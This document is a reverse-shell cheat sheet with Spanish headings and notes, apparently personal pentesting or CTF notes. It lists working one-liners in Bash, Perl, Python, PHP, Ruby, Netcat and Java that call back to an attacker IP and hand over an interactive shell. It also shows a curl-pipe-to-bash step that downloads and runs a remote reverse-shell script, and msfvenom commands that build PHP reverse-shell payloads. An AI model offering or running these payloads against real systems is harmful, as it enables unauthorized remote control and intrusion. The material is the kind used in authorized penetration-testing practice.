### Bash

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

`bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'`

### PERL
(one-line)

`perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`


### Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`

### PHP

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

Crear con msfvenom --> `msfvenom -p php/reverse_tcp LHOST=10.10.14.20 LPORT=443 -f raw > reverse.zip`



### Ruby

`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

### Netcat

`nc -e /bin/sh 10.0.0.1 1234`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

### Java

```
r = Runtime.getRuntime()

p = r.exec(\["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done"\] as String\[\])

p.waitFor()

```

### Curl
* Equipo local:
	index.html --> 
	```
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.20/443 0>&1
	```
	Servicio web en escucha -->`python3 -m http.server 80`
* Equipo remoto:
	`curl -s http://10.10.14.20 | bash`
	
### Payloads con msfvenom
`msfvenom -l payloads | grep "php"` 	// listar los payloads
`msfvenom -p php/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f raw > reverse.zip`
